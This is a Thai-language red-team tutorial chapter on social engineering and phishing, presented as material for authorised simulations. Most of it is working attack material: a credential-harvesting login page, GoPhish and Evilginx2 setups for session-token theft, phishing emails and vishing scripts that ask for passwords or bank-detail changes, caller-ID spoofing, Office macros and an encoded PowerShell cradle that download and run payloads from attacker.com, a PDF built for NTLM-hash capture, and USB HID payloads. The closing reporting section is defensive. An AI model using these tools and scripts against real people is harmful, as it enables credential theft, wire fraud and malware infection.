# Part 18: Social Engineering & Phishing Frameworks
# ขั้นตอนที่ 171-180: Social Engineering และ Phishing

> **คำเตือน**: เนื้อหานี้มีไว้เพื่อการศึกษา Red Team Operations และ Authorized Phishing Simulations เท่านั้น

---

## ขั้นตอนที่ 171: Social Engineering Fundamentals

### 171.1 หลักการ Social Engineering

**จิตวิทยาและเทคนิคที่ใช้:**

1. **Authority** - แสร้งตัวเป็นคนที่มีอำนาจ (CEO, IT Admin, Police)
2. **Urgency** - สร้างความรีบเร่ง (เรื่องด่วนจีบ, ระบบควรดำเนินการหยุด)
3. **Scarcity** - สิ่งที่หายาก/มีเวลาจำกัด
4. **Social Proof** - "\u0e17ุกคนในแผนกกทำแบบนี้"
5. **Reciprocity** - ให้สิ่งก่อน แล้วขอคืน
6. **Liking** - แสร้งความไว้วางใจ

**Attack Vectors:**
- Phishing (Email)
- Vishing (Voice)
- Smishing (SMS)
- Pretexting (สร้างเรื่องเท็จ backstory)
- Baiting (ใช้สิ่งล่อใจ)
- Tailgating/Piggybacking (ตามเข้าพื้นที่)
- Quid Pro Quo

### 171.2 OSINT สำหรับ Social Engineering

```python
#!/usr/bin/env python3
# osint_se.py - OSINT for Social Engineering

import requests
import json

def linkedin_recon(company_name):
    """Recon via LinkedIn (requires authentication)"""
    print(f"[*] LinkedIn Recon for: {company_name}")
    print("Tools:")
    print("  linkedin2username - Extract employee names")
    print("  CrossLinked - Generate email addresses from LinkedIn")
    print("  rengine - Automated recon")

def hunter_io_enum(domain, api_key):
    """Enumerate emails via Hunter.io"""
    url = f"https://api.hunter.io/v2/domain-search"
    params = {
        'domain': domain,
        'api_key': api_key,
        'limit': 100
    }
    
    r = requests.get(url, params=params)
    data = r.json()
    
    if 'data' in data:
        emails = data['data'].get('emails', [])
        print(f"[+] Found {len(emails)} emails for {domain}:")
        for email in emails[:20]:
            print(f"  {email['value']} ({email.get('first_name', '')} {email.get('last_name', '')})")
        
        # Detect email pattern
        pattern = data['data'].get('pattern', '')
        if pattern:
            print(f"[*] Email pattern: {pattern}")
        
        return emails
    return []

def generate_email_formats(first, last, domain):
    """Generate possible email formats"""
    formats = [
        f"{first}.{last}@{domain}",
        f"{first[0]}{last}@{domain}",
        f"{first}{last[0]}@{domain}",
        f"{first}_{last}@{domain}",
        f"{first}@{domain}",
        f"{last}@{domain}",
        f"{first[0]}.{last}@{domain}",
        f"{last}.{first[0]}@{domain}",
    ]
    return formats

def verify_email(email):
    """Check if email exists (various methods)"""
    print(f"[*] Verifying: {email}")
    
    # Method 1: SMTP verification
    import smtplib
    import dns.resolver
    
    domain = email.split('@')[1]
    
    try:
        # Get MX record
        mx_records = dns.resolver.resolve(domain, 'MX')
        mx_host = str(sorted(mx_records, key=lambda x: x.preference)[0].exchange)
        
        # SMTP verification
        smtp = smtplib.SMTP(mx_host, 25, timeout=10)
        smtp.ehlo()
        smtp.mail('verify@test.com')
        code, _ = smtp.rcpt(email)
        smtp.quit()
        
        if code == 250:
            print(f"  [+] Email exists!")
            return True
        else:
            print(f"  [-] Email doesn't exist (code: {code})")
    except Exception as e:
        print(f"  [?] Cannot verify: {e}")
    
    return None

# theHarvester for automated OSINT
print("[*] theHarvester Usage:")
print("  theHarvester -d target.com -b all -l 500")
print("  theHarvester -d target.com -b google,linkedin,twitter")
print("  theHarvester -d target.com -b hunter -l 1000 -f report")
```

---

## ขั้นตอนที่ 172: GoPhish - Phishing Framework

### 172.1 ติดตั้งและใช้งาน GoPhish

```bash
# ติดตั้ง GoPhish
wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip
unzip gophish-linux-64bit.zip -d /opt/gophish
cd /opt/gophish

# แก้ไข config.json
cat > config.json << 'EOF'
{
    "admin_server": {
        "listen_url": "127.0.0.1:3333",
        "use_tls": true,
        "cert_path": "gophish_admin.crt",
        "key_path": "gophish_admin.key"
    },
    "phish_server": {
        "listen_url": "0.0.0.0:80",
        "use_tls": false
    },
    "db_name": "sqlite3",
    "db_path": "gophish.db",
    "migrations_prefix": "db/db_",
    "contact_address": "",
    "logging": {
        "filename": "gophish.log"
    }
}
EOF

# รัน GoPhish
sudo ./gophish &

# เข้า admin panel: https://localhost:3333
# Default credentials: admin / gophish
```

### 172.2 GoPhish Campaign Setup (Python API)

```python
#!/usr/bin/env python3
# gophish_campaign.py - GoPhish automation via API
# pip install gophish

from gophish import Gophish
from gophish.models import *
import datetime

API_KEY = "YOUR_API_KEY_FROM_GOPHISH"
GOPHISH_URL = "https://localhost:3333"

api = Gophish(API_KEY, host=GOPHISH_URL, verify=False)

def create_sending_profile(name, smtp_host, smtp_port, username, password, from_address):
    """Create SMTP sending profile"""
    smtp = SMTP()
    smtp.name = name
    smtp.host = f"{smtp_host}:{smtp_port}"
    smtp.username = username
    smtp.password = password
    smtp.from_address = from_address
    smtp.ignore_cert_errors = True
    
    profile = api.smtp.post(smtp)
    print(f"[+] Sending profile created: {profile.id}")
    return profile

def create_email_template(name, subject, html_body):
    """Create phishing email template"""
    template = Template()
    template.name = name
    template.subject = subject
    template.html = html_body
    template.text = "Please enable HTML to view this email."
    
    # Add tracking pixel
    template.html += '<img src="{{.TrackingURL}}" width="1" height="1" />'
    
    result = api.templates.post(template)
    print(f"[+] Email template created: {result.id}")
    return result

def create_landing_page(name, html_content, redirect_url):
    """Create phishing landing page"""
    page = Page()
    page.name = name
    page.html = html_content
    page.capture_credentials = True
    page.capture_passwords = True
    page.redirect_url = redirect_url
    
    result = api.pages.post(page)
    print(f"[+] Landing page created: {result.id}")
    return result

def create_target_group(name, targets):
    """
    targets = [
        {'first_name': 'John', 'last_name': 'Doe',
         'email': 'jdoe@target.com', 'position': 'Manager'}
    ]
    """
    group = Group()
    group.name = name
    group.targets = [User(**t) for t in targets]
    
    result = api.groups.post(group)
    print(f"[+] Target group created: {result.id} ({len(targets)} targets)")
    return result

def launch_campaign(name, smtp_id, template_id, page_id, group_id, phish_url):
    """Launch phishing campaign"""
    campaign = Campaign()
    campaign.name = name
    campaign.smtp = SMTP(id=smtp_id)
    campaign.template = Template(id=template_id)
    campaign.page = Page(id=page_id)
    campaign.groups = [Group(id=group_id)]
    campaign.url = phish_url
    campaign.launch_date = datetime.datetime.now()
    
    result = api.campaigns.post(campaign)
    print(f"[+] Campaign launched: {result.id}")
    print(f"[*] Phishing URL: {phish_url}")
    return result

def get_campaign_stats(campaign_id):
    """Get campaign statistics"""
    summary = api.campaigns.summary(campaign_id)
    
    stats = summary.stats
    print(f"\n=== Campaign Statistics ===")
    print(f"Total Sent: {stats.total}")
    print(f"Email Opened: {stats.opened} ({stats.opened/stats.total*100:.1f}%)")
    print(f"Links Clicked: {stats.clicked} ({stats.clicked/stats.total*100:.1f}%)")
    print(f"Credentials Submitted: {stats.submitted_data} ({stats.submitted_data/stats.total*100:.1f}%)")
    
    return stats

# Example phishing email template (Microsoft credential phish)
OFFICE365_PHISH = '''
<html>
<body style="font-family: Segoe UI, Arial; background: #f5f5f5; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto; background: white; padding: 30px; border: 1px solid #ddd;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" 
         width="108" height="23" alt="Microsoft">
    <hr style="margin: 20px 0;">
    <h2 style="color: #333;">Your Microsoft 365 account requires attention</h2>
    <p>Dear {{.FirstName}},</p>
    <p>We detected unusual sign-in activity on your Microsoft 365 account. 
       Please verify your identity immediately to prevent account suspension.</p>
    <p><a href="{{.URL}}" style="background: #0078d4; color: white; padding: 12px 24px; 
       text-decoration: none; border-radius: 2px;">Verify Now</a></p>
    <p style="color: #666; font-size: 12px;">If you did not request this, please contact IT Support.</p>
    <p style="color: #666; font-size: 12px;">Microsoft Account Team</p>
</div>
</body>
</html>
'''
```

---

## ขั้นตอนที่ 173: Evilginx2 - Phishing with MFA Bypass

### 173.1 Evilginx2 Setup

```bash
# Evilginx2 - Reverse proxy phishing สามารถบันทึก session cookie ได้
# แม้ target ใช้ MFA!

# ติดตั้ง
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
go build

# ใช้ phishlets สำเร็จรูป (phishlets directory)
ls phishlets/  # microsoft, google, facebook, twitter, etc.

# รัน evilginx2
sudo ./evilginx2 -p ./phishlets

# evilginx2 commands:
: config domain phishing.attacker.com
: config ip 1.2.3.4

# Enable phishlet
: phishlets enable microsoft

# Create lure URL
: lures create microsoft
: lures get-url 0

# View captured sessions
: sessions
: sessions 1  # ดู detail

# Session มี token สำหรับเข้าถึงบัญชี
: sessions 1 | grep token
```

### 173.2 Custom Phishlet

```yaml
# custom_phishlet.yaml - Custom phishlet for internal app
name: 'corporate-portal'
author: 'red-team'
min_ver: '2.3.0'

proxy_hosts:
  - phish_sub: 'portal'
    orig_sub: 'portal'
    domain: 'corp.internal'
    session: true
    is_landing: true

sub_filters:
  - triggers_on: 'portal.corp.internal'
    orig_sub: 'portal'
    domain: 'corp.internal'
    search: 'portal\.corp\.internal'
    replace: 'portal.phishing-site.com'
    mimes: ['text/html', 'application/json', 'application/javascript']

auth_tokens:
  - domain: '.corp.internal'
    keys: ['session', 'auth_token', 'JSESSIONID']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'portal.corp.internal'
  path: '/login'

force_post:
  - path: '/api/auth'
    search:
      - {key: 'username', search: '(.*)'}
      - {key: 'password', search: '(.*)'}
```

---

## ขั้นตอนที่ 174: SET (Social Engineering Toolkit)

### 174.1 SET Framework

```bash
# SET - Social Engineering Toolkit
# ติดตั้ง หรือเรียกจากเมนู

sudo apt install -y set
set-toolkit

# เมนูหลัก:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules
# 4) Update the Social-Engineer Toolkit

# Social Engineering Attacks:
# 1) Spear-Phishing Attack Vectors
# 2) Website Attack Vectors
# 3) Infectious Media Generator
# 4) Create a Payload and Listener
# 5) Mass Mailer Attack
# 6) Arduino-Based Attack Vector
# 7) Wireless Access Point Attack Vector
# 8) QRCode Generator Attack Vector
# 9) Powershell Attack Vectors
# 10) Third Party Modules

# Website Attack Vectors:
# 1) Java Applet Attack Method
# 2) Metasploit Browser Exploit Method
# 3) Credential Harvester Attack Method  <-- ที่ใช้บ่อยที่สุด
# 4) Tabnabbing Attack Method
# 5) Web Jacking Attack Method
# 6) Multi-Attack Web Method

# Clone เว็บไซต์:
set:webattack> 2  # Site Cloner
set:webattack> Enter the URL to clone: https://www.google.com
set:webattack> Enter the IP address for POST back: 192.168.1.100
```

### 174.2 Automated SET via Python

```python
#!/usr/bin/env python3
# set_automation.py - Automate SET credential harvester

import subprocess
import threading
import socket
import os

def run_set_harvester(clone_url, listen_ip, listen_port=80):
    """
    Start credential harvester that clones target website
    """
    # SET configuration
    set_config = f"""
1
2
3
2
{clone_url}
{listen_ip}
"""
    
    # Write config to temp file
    with open('/tmp/set_commands.txt', 'w') as f:
        f.write(set_config)
    
    # Run SET
    process = subprocess.Popen(
        ['setoolkit'],
        stdin=open('/tmp/set_commands.txt'),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    return process

def start_simple_harvester(port=8080):
    """Simple credential harvester without SET"""
    from flask import Flask, request, redirect, render_template_string
    
    app = Flask(__name__)
    captured = []
    
    # Clone a login page (simplified)
    LOGIN_PAGE = '''
    <html>
    <head><title>Corporate Login</title></head>
    <body style="background:#f0f0f0; display:flex; justify-content:center; padding:50px">
    <div style="background:white; padding:30px; border-radius:8px; width:300px">
        <h2>Corporate Portal Login</h2>
        <form method="post" action="/login">
            <div><label>Username:</label><br>
            <input type="text" name="username" style="width:100%"></div><br>
            <div><label>Password:</label><br>
            <input type="password" name="password" style="width:100%"></div><br>
            <button type="submit" style="width:100%; background:#0078d4; color:white; padding:10px">
                Sign In
            </button>
        </form>
    </div>
    </body></html>
    '''
    
    @app.route('/')
    def index():
        return LOGIN_PAGE
    
    @app.route('/login', methods=['POST'])
    def login():
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        captured.append({
            'ip': ip,
            'username': username,
            'password': password,
            'user_agent': user_agent
        })
        
        print(f"\n[!] CREDENTIALS CAPTURED!")
        print(f"    IP: {ip}")
        print(f"    Username: {username}")
        print(f"    Password: {password}")
        
        # Save to file
        with open('/tmp/harvested_creds.txt', 'a') as f:
            f.write(f"{ip}|{username}|{password}|{user_agent}\n")
        
        # Redirect to real site
        return redirect('https://corporate.company.com')
    
    @app.route('/results')
    def results():
        result = f"Captured {len(captured)} credentials:<br>"
        for c in captured:
            result += f"IP: {c['ip']}, User: {c['username']}, Pass: {c['password']}<br>"
        return result
    
    print(f"[*] Credential harvester running on port {port}")
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    start_simple_harvester()
```

---

## ขั้นตอนที่ 175: Vishing (Voice Phishing)

### 175.1 Vishing Techniques

```bash
# Caller ID Spoofing Tools

# SIPp - SIP Testing Tool
sudo apt install -y sipp

# SpoofCard/SpoofBox (commercial services for authorized testing)
# Twilio with masked number (for authorized phishing simulations)

# Asterisk PBX setup for Vishing
sudo apt install -y asterisk

# Basic Asterisk dialplan for caller ID spoofing
cat >> /etc/asterisk/extensions.conf << 'EOF'
[outbound-spoofed]
exten => _X.,1,Set(CALLERID(num)=18005551234)
exten => _X.,2,Set(CALLERID(name)=IT Support)
exten => _X.,3,Dial(SIP/${EXTEN}@voip-provider)
exten => _X.,4,Hangup()
EOF
```

### 175.2 Vishing Script Templates

```python
#!/usr/bin/env python3
# vishing_scripts.py - Professional Vishing Script Examples
# สำหรับใช้ใน Authorized Social Engineering Assessments

VISHING_SCRIPTS = {
    'it_helpdesk': '''
    ==== IT HELPDESK VISHING SCRIPT ====
    
    Caller: "Good morning/afternoon, this is [Name] from the IT Security team.
            We're conducting emergency security updates and have detected
            suspicious activity on your account."
    
    Target: [responds]
    
    Caller: "For security purposes, I'll need to verify your identity first.
            Can you confirm your employee ID and current password?"
    
    [If they ask why]: "This is standard procedure during security incidents.
                       We need to reset your credentials immediately to prevent
                       unauthorized access."
    
    Social Engineering Elements:
    - Authority (IT Security Team)
    - Urgency (suspicious activity)
    - Fear (unauthorized access)
    ''',
    
    'vendor_pretexting': '''
    ==== VENDOR PRETEXTING SCRIPT ====
    
    Context: Research target's vendors beforehand (OSINT)
    
    Caller: "Hi, this is [Name] from [Known Vendor name].
            I'm calling about the invoice you have on hold.
            I was told to speak with someone in accounts payable."
    
    [Transfer to accounts payable]
    
    Caller: "Yes hi, I'm following up on invoice #[made-up number].
            We need to update our banking details in your system.
            Could you update the ACH routing and account number?"
    
    Social Engineering Elements:
    - Familiarity (known vendor)
    - Legitimacy (specific details)
    - Process compliance
    ''',
    
    'ceo_fraud': '''
    ==== CEO FRAUD / BEC SCRIPT ====
    
    Context: Email first, then call to verify
    
    Initial Email:
    From: CEO.Name@[lookalike-domain].com
    Subject: Urgent Wire Transfer - Confidential
    
    Body: "I need you to process an urgent wire transfer.
           This is time-sensitive and confidential.
           Please proceed immediately."
    
    Follow-up Call:
    "Hi, this is [CEO Name]. Did you receive my email about the wire?
     I need this processed by end of day. Please keep this confidential."
    
    Social Engineering Elements:
    - High authority (CEO)
    - Urgency (end of day)
    - Secrecy (bypass normal checks)
    '''
}

for name, script in VISHING_SCRIPTS.items():
    print(f"\n{'='*60}")
    print(f"Script: {name}")
    print(script)
```

---

## ขั้นตอนที่ 176: Spear Phishing Email Crafting

### 176.1 Email Infrastructure Setup

```bash
# Setup Phishing Email Infrastructure

# 1. Domain Setup
#    - Register domain similar to target: corp0ration.com, c0rporation.com
#    - Setup MX records
#    - Setup SPF, DKIM, DMARC for deliverability

# ตัวอย่าง SPF record:
# target.com. IN TXT "v=spf1 include:phishing-server.com ~all"

# DKIM Setup
sudo apt install -y opendkim
opendkim-genkey -s phish -d phishing-domain.com

# เพิ่มไปใน DNS:
# phish._domainkey.phishing-domain.com TXT "v=DKIM1; k=rsa; p=[PUBLIC_KEY]"

# 2. Postfix SMTP Server
sudo apt install -y postfix
sudo postfix start

# Configure /etc/postfix/main.cf
cat >> /etc/postfix/main.cf << 'EOF'
myhostname = mail.phishing-domain.com
mydomain = phishing-domain.com
myorigin = $mydomain
relayhost =
smtp_sasl_auth_enable = no
EOF

# 3. Email headers to avoid spam filters
# - Use legitimate email service (SendGrid, Mailgun) for better deliverability
# - Warm up IP over time
# - Avoid spam keywords
```

### 176.2 Spear Phishing Email Templates

```python
#!/usr/bin/env python3
# spear_phish.py - Craft targeted spear phishing emails

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

def craft_spear_phish(target_info, smtp_config):
    """
    target_info = {
        'name': 'John Doe',
        'email': 'jdoe@target.com',
        'position': 'Finance Manager',
        'company': 'Acme Corp',
        'manager': 'Jane Smith'
    }
    """
    
    # Personalized subject lines
    subjects = [
        f"Action Required: Q4 Budget Review - {target_info['company']}",
        f"Urgent: {target_info['name']}'s Direct Deposit Update",
        f"Re: Meeting tomorrow with {target_info['manager']}",
        f"Your {target_info['company']} account requires verification",
        f"DocuSign: Document awaiting your signature",
    ]
    
    # Personalized email body
    html_body = f"""
    <html>
    <body style="font-family: Arial, sans-serif;">
    <p>Dear {target_info['name']},</p>
    
    <p>I hope this message finds you well. As the {target_info['position']} at 
    {target_info['company']}, we need your immediate attention on an important 
    matter regarding your account security.</p>
    
    <p>Our security team has detected multiple failed login attempts on your
    corporate account. To protect your credentials, please verify your identity
    by clicking the secure link below:</p>
    
    <p><a href="https://corporate-secure-login.phishing-domain.com/verify?user={target_info['email'].replace('@','%40')}"
       style="background:#0078d4; color:white; padding:10px 20px; text-decoration:none;">
       Verify My Identity
    </a></p>
    
    <p>This link expires in 24 hours. If you believe this is an error,
    please contact your IT department immediately.</p>
    
    <p>Best regards,<br>
    IT Security Team<br>
    {target_info['company']}</p>
    
    <hr>
    <p style="font-size:11px; color:#666;">
    This is an automated security notification from {target_info['company']} IT.
    Do not reply to this email.</p>
    </body>
    </html>
    """
    
    return subjects[0], html_body

def send_phish_email(to_email, from_email, subject, html_body, 
                      attachment=None, smtp_config=None):
    """Send phishing email via SMTP"""
    if not smtp_config:
        smtp_config = {
            'host': 'mail.phishing-domain.com',
            'port': 587,
            'user': 'noreply@phishing-domain.com',
            'password': 'smtp_password'
        }
    
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = to_email
    
    # Add HTML body
    msg.attach(MIMEText(html_body, 'html'))
    
    # Add attachment if provided
    if attachment and os.path.exists(attachment):
        with open(attachment, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header(
            'Content-Disposition',
            f'attachment; filename="{os.path.basename(attachment)}"'
        )
        msg.attach(part)
    
    try:
        with smtplib.SMTP(smtp_config['host'], smtp_config['port']) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.login(smtp_config['user'], smtp_config['password'])
            smtp.send_message(msg)
        print(f"[+] Email sent to: {to_email}")
    except Exception as e:
        print(f"[-] Failed to send to {to_email}: {e}")
```

---

## ขั้นตอนที่ 177: Malicious Documents

### 177.1 Office Macro Attacks

```python
#!/usr/bin/env python3
# office_macro.py - Generate malicious Office documents
# pip install python-docx

# วิธีที่ 1: msfvenom macro
print("[*] Generate VBA macro payload with msfvenom:")
print("msfvenom -p windows/x64/meterpreter/reverse_https \\")
print("    LHOST=192.168.1.100 LPORT=443 \\")
print("    -f vba-exe > macro.vbs")

# วิธีที่ 2: Custom VBA macro
VBA_MACRO = '''
Private Sub Document_Open()
    AutoOpen
End Sub

Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    ' Download and execute payload
    Dim url As String
    url = "http://attacker.com/payload.exe"
    
    Dim path As String
    path = Environ("TEMP") & "\\svchost.exe"
    
    ' Download
    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objHTTP.Open "GET", url, False
    objHTTP.send
    
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    With objStream
        .Type = 1
        .Open
        .Write objHTTP.responseBody
        .SaveToFile path, 2
        .Close
    End With
    
    ' Execute
    objShell.Run Chr(34) & path & Chr(34), 0, False
End Sub
'''

# วิธีที่ 3: PowerShell via Macro
VBA_POWERSHELL = '''
Sub AutoOpen()
    Dim ps As String
    ps = "powershell.exe -WindowStyle Hidden -EncodedCommand " & Chr(34)
    
    ' Base64 encoded PowerShell
    Dim cmd As String
    cmd = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABzAC4AcABzADEAJwApAA=="
    
    ps = ps & cmd & Chr(34)
    
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run ps, 0, False
End Sub
'''

# วิธีที่ 4: DDE Injection (no macro needed)
DDE_ATTACK = """
DDE Injection steps in Word:
1. Insert > Field
2. Field name: = (Formula)
3. Field code:
   = c:\\windows\\system32\\cmd.exe /c powershell -w hidden -c "YOUR_COMMAND" \\* MERGEFORMAT
4. Right-click > Toggle Field Codes
5. Save as .docx

Or use:
    { DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -w hidden -c command" }
"""
print(DDE_ATTACK)

# วิธีที่ 5: maldoc using macro_pack
print("[*] macro_pack tool:")
print("git clone https://github.com/sevagas/macro_pack.git")
print("echo 'meterpreter/reverse_tcp|192.168.1.100|4444' | python3 macro_pack.py -t METERPRETER -G evil.docm")
```

### 177.2 PDF Attacks

```bash
# PDF-based attack techniques

# 1. msfvenom PDF payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 \
    LPORT=4444 \
    -f pdf \
    -o invoice.pdf

# 2. peepdf - PDF analysis
pip3 install peepdf
peepdf -i invoice_suspicious.pdf
# ดู JavaScript, URIs, embedded files

# 3. pdf-parser
sudo apt install -y pdf-parser
pdf-parser.py --search javascript suspicious.pdf
pdf-parser.py --stats suspicious.pdf

# 4. PDF with embedded EXE
# office2john สำหรับแตก password
office2john.py protected.pdf > pdf_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt

# 5. Create PDF with NTLM Capture (UNC path)
# Embed UNC path in PDF: \\attacker.com\share\file.pdf
# When opened, Windows sends NTLM hash to attacker
python3 << 'EOF'
# Generate PDF with embedded UNC path
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter

c = canvas.Canvas('invoice.pdf', pagesize=letter)
c.drawString(100, 750, 'Invoice #12345')
c.drawString(100, 700, 'Click here to view full invoice:')
c.linkURL('file://\\\\192.168.1.100\\share\\invoice.pdf',
           (100, 690, 300, 710))
c.save()
print('[+] PDF with UNC path created: invoice.pdf')
EOF

# Capture NTLM hash with Responder
sudo responder -I eth0 -rdwv
# When victim opens PDF -> hash captured!
```

---

## ขั้นตอนที่ 178: Pretexting และ Physical Attacks

### 178.1 USB Drop Attack

```python
#!/usr/bin/env python3
# usb_payload.py - USB Drop Attack Techniques

# HID Attack with Rubber Ducky / Bash Bunny
# https://shop.hak5.org/

# Rubber Ducky payload (DuckyScript)
DUCKY_PAYLOAD = '''
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/rev.ps1')
ENTER
'''

with open('payload.txt', 'w') as f:
    f.write(DUCKY_PAYLOAD)
print("[+] Rubber Ducky payload written to: payload.txt")

# Create autorun.inf (older Windows)
AUTORUN_INF = '''
[AutoRun]
open=payload.exe
Action=Open folder to view files
Label=USB Drive
Shell\Open=Open folder to view files
Shell\Open\Command=payload.exe
'''

with open('autorun.inf', 'w') as f:
    f.write(AUTORUN_INF)

# LNK file trick (Windows shortcut with hidden command)
LNK_TRICK = '''
# Create malicious LNK file
import win32com.client

shell = win32com.client.Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut('Important_Documents.lnk')
shortcut.TargetPath = 'C:\\Windows\\System32\\cmd.exe'
shortcut.Arguments = '/c powershell -w hidden -c IEX(...)'
shortcut.WorkingDirectory = 'C:\\'
shortcut.IconLocation = 'C:\\Windows\\System32\\shell32.dll,3'
shortcut.save()
'''
print("[*] LNK trick (Windows only):")
print(LNK_TRICK)

# P4wnP1 A.L.O.A (Pi Zero W based)
P4WNP1_CONFIG = '''
# P4wnP1 config for HID attack
HID_ATTACK_PAYLOAD = """
type("powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://C2/rev.ps1')\"")
press_key("ENTER")
"""

# Flash to Pi Zero W:
# 1. Flash P4wnP1 A.L.O.A image
# 2. Connect via WiFi: P4wnP1_
# 3. Upload payload via web UI
# 4. Plug into target machine
'''
print(P4WNP1_CONFIG)
```

### 178.2 Physical Social Engineering

```bash
# Physical Security Assessment Techniques

# 1. Badge Cloning
# Tools: Proxmark3, ACR122U NFC Reader

# Install Proxmark3 tools
sudo apt install -y proxmark3

# Read RFID/NFC badge
# pm3 > hf 14a scan
# pm3 > hf mf info
# pm3 > hf mf dump
# pm3 > hf mf sim (emulate cloned card)

# 2. Lock picking
# Tools for assessment:
# - Pick set (tension wrench + picks)
# - Bump key
# - Bypass shimming for padlocks

# 3. Tailgating countermeasures to identify:
echo "[*] Physical security weaknesses to test:"
cat << 'EOF'
1. Tailgating/piggybacking through secure doors
2. Dumpster diving (document disposal policy)
3. Shoulder surfing (screen visibility)
4. Impersonation (delivery person, IT support)
5. Badge access (RFID cloning opportunities)
6. Visitor badge controls
7. Clean desk policy
8. Unlocked workstations
9. Wireless exposure (rogue APs possible?)
10. Physical USB ports accessible
EOF
```

---

## ขั้นตอนที่ 179: Phishing Simulation Reporting

### 179.1 Campaign Analytics

```python
#!/usr/bin/env python3
# phishing_report.py - Phishing Campaign Report Generator

import json
import datetime
from collections import Counter

class PhishingReport:
    def __init__(self, campaign_name, organization):
        self.campaign_name = campaign_name
        self.organization = organization
        self.events = []
    
    def add_event(self, event_type, target_email, timestamp=None, details=None):
        """
        event_type: 'sent', 'opened', 'clicked', 'submitted', 'reported'
        """
        self.events.append({
            'type': event_type,
            'email': target_email,
            'timestamp': timestamp or datetime.datetime.now().isoformat(),
            'details': details or {}
        })
    
    def calculate_stats(self):
        by_type = Counter(e['type'] for e in self.events)
        unique_users = Counter(e['email'] for e in self.events)
        
        total_sent = by_type.get('sent', 0)
        
        stats = {
            'total_sent': total_sent,
            'opened': by_type.get('opened', 0),
            'clicked': by_type.get('clicked', 0),
            'submitted': by_type.get('submitted', 0),
            'reported': by_type.get('reported', 0),
        }
        
        if total_sent > 0:
            stats['open_rate'] = round(stats['opened'] / total_sent * 100, 1)
            stats['click_rate'] = round(stats['clicked'] / total_sent * 100, 1)
            stats['submit_rate'] = round(stats['submitted'] / total_sent * 100, 1)
            stats['report_rate'] = round(stats['reported'] / total_sent * 100, 1)
        
        return stats
    
    def generate_html_report(self):
        stats = self.calculate_stats()
        
        # Department analysis
        departments = {}
        for e in self.events:
            if '@' in e['email']:
                dept = e['details'].get('department', 'Unknown')
                if dept not in departments:
                    departments[dept] = Counter()
                departments[dept][e['type']] += 1
        
        report = f"""
<!DOCTYPE html>
<html>
<head><title>Phishing Simulation Report</title>
<style>
body {{ font-family: Arial; max-width: 1200px; margin: 0 auto; padding: 20px; }}
.stat-box {{ display: inline-block; background: #f0f0f0; padding: 20px; 
              margin: 10px; border-radius: 8px; text-align: center; min-width: 150px; }}
.stat-number {{ font-size: 2em; font-weight: bold; }}
.red {{ color: #d32f2f; }}
.orange {{ color: #f57c00; }}
.green {{ color: #388e3c; }}
table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
th, td {{ padding: 10px; border: 1px solid #ddd; text-align: left; }}
th {{ background: #1976d2; color: white; }}
</style></head>
<body>
<h1>Phishing Simulation Report</h1>
<h2>Campaign: {self.campaign_name}</h2>
<p>Organization: {self.organization} | Date: {datetime.datetime.now().strftime('%Y-%m-%d')}</p>

<h3>Executive Summary</h3>
<div>
    <div class="stat-box">
        <div class="stat-number">{stats['total_sent']}</div>
        <div>Emails Sent</div>
    </div>
    <div class="stat-box">
        <div class="stat-number orange">{stats.get('open_rate', 0)}%</div>
        <div>Open Rate</div>
    </div>
    <div class="stat-box">
        <div class="stat-number red">{stats.get('click_rate', 0)}%</div>
        <div>Click Rate</div>
    </div>
    <div class="stat-box">
        <div class="stat-number red">{stats.get('submit_rate', 0)}%</div>
        <div>Credential Submission</div>
    </div>
    <div class="stat-box">
        <div class="stat-number green">{stats.get('report_rate', 0)}%</div>
        <div>Reported Phishing</div>
    </div>
</div>

<h3>Risk Assessment</h3>
<p>Based on industry benchmarks:</p>
<ul>
    <li>Click Rate &lt; 5%: <strong>Low Risk</strong></li>
    <li>Click Rate 5-15%: <strong>Medium Risk</strong></li>
    <li>Click Rate &gt; 15%: <strong>High Risk</strong> - Immediate training required</li>
</ul>
<p><strong>Current status: {'HIGH RISK' if stats.get('click_rate', 0) > 15 else 'MEDIUM RISK' if stats.get('click_rate', 0) > 5 else 'LOW RISK'}</strong></p>

<h3>Recommendations</h3>
<ol>
    <li>Mandatory security awareness training for all employees</li>
    <li>Implement email authentication (SPF, DKIM, DMARC)</li>
    <li>Deploy advanced email filtering solution</li>
    <li>Enable MFA on all accounts</li>
